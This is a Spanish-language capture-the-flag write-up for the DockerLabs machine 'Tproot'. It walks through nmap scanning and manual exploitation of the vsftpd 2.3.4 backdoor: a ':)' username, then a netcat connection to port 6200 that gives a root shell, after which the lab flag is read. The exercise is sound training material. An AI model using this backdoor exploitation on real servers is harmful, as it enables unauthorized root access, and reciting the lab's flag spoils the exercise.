<section align="center">

# 💥Tproot Write Up💥

![Dificultad](https://img.shields.io/badge/Dificultad-Muy%20Facil-green?style=for-the-badge)
![Plataforma](https://img.shields.io/badge/Plataforma-DockerLabs-blue?style=for-the-badge)

</section>

## 🚀 Despliegue

Una vez descargado el ctf, lo extreamos y accedemos a su respectiva carpeta desde la terminal, luego iniciamos la maquina con:

```bash
sudo bash auto_deploy.sh firsthacking.tar
```

## 🔍Escaneo y enumeracion

para empezar con el ctf, realizamos un escaneo general con nmap:

```bash
nmap 172.17.0.2
```

nos devuelve esto:

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-07 11:53 -03
Nmap scan report for 172.17.0.2
Host is up (0.0011s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.02 seconds
```

aunque ya nos hacemos una idea de que puerto esta abierto, que seria el 21 con el servico **ftp**, pueden haber mas servicios en los puertos no comunes, para una mayor precision, podemos realizar un escaneo a todos los puertos:

```bash
nmap -p- 172.17.0.2
```

nos devuelve:

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-07 11:53 -03
Nmap scan report for 172.17.0.2
Host is up (0.00020s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.18 seconds
```

una vez estamos seguros que es el unico puerto abierto, realizamos un escaneo especifico y detallado para saber mas sobre ese servicio:

```bash
nmap -p21 -sC -sV 172.17.0.2
```

### 🛠️Parametros usados

| Parametro | Descripcion |
| :--- | :--- |
| **`-p21,80`** | indico que solo quiero un escaneo para esos puertos en especifico |
| **`-sC`** | ejecuta varios scripts basicos para obtener informacion extra |
| **`-sV`** | me muestra la version que usa este servicio ftp |

nos devuelve:

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-07 11:53 -03
Nmap scan report for 172.17.0.2
Host is up (0.00022s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
|_ftp-anon: got code 500 "OOPS: cannot change directory:/var/ftp".
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.36 seconds
```

Como podemos ver, la version del servicio ftp es una con una vulnerabilidad critica conocida, antes de explotarla, realice escaneo en busca de directorios en el servicio http pero no encontre nada

## ☠️Explotacion

El primer paso para atacar manualmente este servicio, debemos entender que esta vulnerabilidad fue provocada de forma conciente, ya que la idea es que al poner ":)" en el usuario al intentar conectarte al servicio ftp, se iniciaria otro servicio ftp en el puerto 6200 con usuario root.

nos conectamos con:

```bash
ftp 172.17.0.2
```

al hacerlo, nos pedira un usuario, podemos cualquier cosa pero lo terminamos con la carina feliz ":)" (sin las comillas), luego al pedir contraseña, ponemos tambien cualquier cosa.

puede dar error o puede quedarse cargando, sea cual sea, abrimos una nueva terminal y con netcat intentamos conectamos por el puerto 6200:

```bash
nc -v 172.17.0.2 6200
```
### 🛠️Parametros usados

| Parametro | Descripcion |
| :--- | :--- |
| **`-v`** | indico que quiero informacion sobre lo que sucede, no es obligatorio usarlo |
| **`6200`** | indico el puerto |

lo que nos devuelve:

```bash
Connection to 172.17.0.2 6200 port [tcp/*] succeeded!
whoami
root
```

Luego, podemos entrar a la siguiente carpeta y leer la bandera buscada:

```bash
cat root/root.txt
261fd3f32200f950f231816b4e9a0594
```

